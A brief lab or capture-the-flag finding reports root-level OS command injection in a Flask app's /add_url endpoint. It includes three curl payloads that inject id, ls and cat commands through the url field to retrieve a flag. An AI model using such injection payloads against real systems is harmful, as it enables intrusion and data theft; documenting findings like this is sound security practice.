Vulnerability: OS command injection in POST /add_url (SiteSaver, Flask/Werkzeug 3.0.3). The `url` parameter is embedded unsanitized into a shell command used to validate the URL (HTTP status check); command output is reflected in the JSON response `message`. Runs as root inside the container (verified: uid=0(root)).

Reproduction:
1. curl -X POST http://web:5003/add_url -d 'url=http://example.com"; id #'  → message reflects "200uid=0(root) ... status"
2. curl -X POST http://web:5003/add_url -d 'url=http://example.com"; ls -la #' → shows /app/flag.txt
3. curl -X POST http://web:5003/add_url -d 'url=http://example.com"; cat flag.txt #' → message contains FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}

